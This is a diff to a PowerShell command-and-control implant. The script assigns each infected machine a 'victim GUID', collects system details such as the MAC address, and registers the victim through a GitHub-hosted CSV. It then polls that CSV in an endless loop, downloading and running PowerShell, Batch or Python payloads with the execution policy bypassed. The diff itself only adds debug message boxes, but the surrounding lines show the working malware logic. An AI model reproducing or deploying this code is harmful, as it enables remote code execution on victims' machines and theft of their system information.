@@ -32,6 +32,7 @@ if (-not (Test-Path $PayloadFolder)) {
     New-Item -ItemType Directory -Path $PayloadFolder | Out-Null
 }
 Log-Message "[$(Get-Date)] === Watcher started ==="
+[System.Windows.MessageBox]::Show("Watcher started.")
 
 # === LOAD OR GENERATE VICTIM GUID ===
 $Victim_GUID = ""
@@ -53,6 +54,7 @@ if (-not $Victim_GUID -or $Victim_GUID -eq "") {
     $Victim_GUID | Out-File -Encoding UTF8 -FilePath $GuidFile
 }
 Log-Message "[$(Get-Date)] GUID: $Victim_GUID"
+[System.Windows.MessageBox]::Show("GUID: $Victim_GUID")
 
 # === INITIALIZE WEB CLIENT ===
 $wc = New-Object System.Net.WebClient
@@ -65,6 +67,7 @@ Add-Type -AssemblyName PresentationFramework
 
 # === FETCH CSV METADATA AND DOWNLOAD URL ONCE ===
 try {
+    [System.Windows.MessageBox]::Show("Fetching CSV metadata...")
     $MetaURL = "https://api.github.com/repos/$RepoOwner/$RepoName/contents/$CsvPathInRepo"
     $metaJson = $wc.DownloadString($MetaURL)
     $metaObj = ConvertFrom-Json $metaJson
@@ -74,6 +77,8 @@ try {
     if (-not $downloadUrl) {
         throw "Failed to obtain download URL."
     }
+
+    [System.Windows.MessageBox]::Show("Download URL fetched successfully.")
 
     $csvText = $wc.DownloadString($downloadUrl)
     $lines = $csvText -split "`r?`n"
@@ -91,6 +96,7 @@ try {
     }
 
     if (-not $alreadyExists) {
+        [System.Windows.MessageBox]::Show("Victim not found in CSV. Registering...")
         # === COLLECT SYSTEM INFO ===
         $macs = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress }
         $mac  = if ($macs.Count -gt 0) { $macs[0].MACAddress } else { "UNKNOWN" }
@@ -146,25 +152,26 @@ try {
         $upload.GetResponse().Close()
 
         Log-Message "[$(Get-Date)] ✅ New victim registered."
-        [System.Windows.MessageBox]::Show('User is successfully registered.')
+        [System.Windows.MessageBox]::Show("User successfully registered.")
     }
     else {
         Log-Message "[$(Get-Date)] Victim already registered."
-        [System.Windows.MessageBox]::Show('User already registered.')
+        [System.Windows.MessageBox]::Show("User already registered.")
     }
 }
 catch {
     Log-Message "[$(Get-Date)] ❌ Registration failed: $_"
-    [System.Windows.MessageBox]::Show('Registration failed: ' + $_)
+    [System.Windows.MessageBox]::Show("Registration failed: " + $_)
 }
 
 # === WAIT BEFORE STARTING POLLING ===
 Start-Sleep -Seconds $FirstWaitSeconds
+[System.Windows.MessageBox]::Show("Starting polling loop...")
 
 # === POLLING LOOP ===
 while ($true) {
     try {
-        # Always refresh the CSV to get updated commands
+        [System.Windows.MessageBox]::Show("Polling: downloading CSV...")
         $csvText = $wc.DownloadString($downloadUrl)
         $lines = $csvText -split "`r?`n"
         $foundPayload = $false
@@ -184,37 +191,45 @@ while ($true) {
                     elseif ($payloadType -eq "Python") { $ext = ".py" }
                     else {
                         Log-Message "[$(Get-Date)] ⚠️ Unknown payload type: $payloadType"
+                        [System.Windows.MessageBox]::Show("Unknown payload type: $payloadType")
                         continue
                     }
 
                     $localPath = Join-Path $PayloadFolder ("payload" + $ext)
 
+                    [System.Windows.MessageBox]::Show("Downloading payload from: $payloadURL")
                     (New-Object Net.WebClient).DownloadString($payloadURL) | Out-File -Encoding UTF8 -FilePath $localPath
 
                     if ($payloadType -eq "PowerShell") {
                         Log-Message "[$(Get-Date)] ⚡ Executing PowerShell payload..."
+                        [System.Windows.MessageBox]::Show("Executing PowerShell payload...")
                         powershell -ExecutionPolicy Bypass -File "$localPath"
                     }
                     elseif ($payloadType -eq "Batch") {
                         Log-Message "[$(Get-Date)] ⚡ Executing Batch payload..."
+                        [System.Windows.MessageBox]::Show("Executing Batch payload...")
                         Start-Process -FilePath "$localPath"
                     }
                     elseif ($payloadType -eq "Python") {
                         Log-Message "[$(Get-Date)] ⚡ Executing Python payload..."
+                        [System.Windows.MessageBox]::Show("Executing Python payload...")
                         Start-Process -FilePath "python.exe" -ArgumentList "$localPath"
                     }
 
                     Log-Message "[$(Get-Date)] ✅ Executed $payloadType from $payloadURL"
+                    [System.Windows.MessageBox]::Show("Executed $payloadType successfully.")
                 }
             }
         }
 
         if (-not $foundPayload) {
             Log-Message "[$(Get-Date)] ⚠️ No payload found for this GUID."
+            [System.Windows.MessageBox]::Show("No payload found for this GUID.")
         }
     }
     catch {
         Log-Message "[$(Get-Date)] ❌ Polling error: $_"
+        [System.Windows.MessageBox]::Show("Polling error: " + $_)
     }
 
     Start-Sleep -Seconds $LoopIntervalSeconds
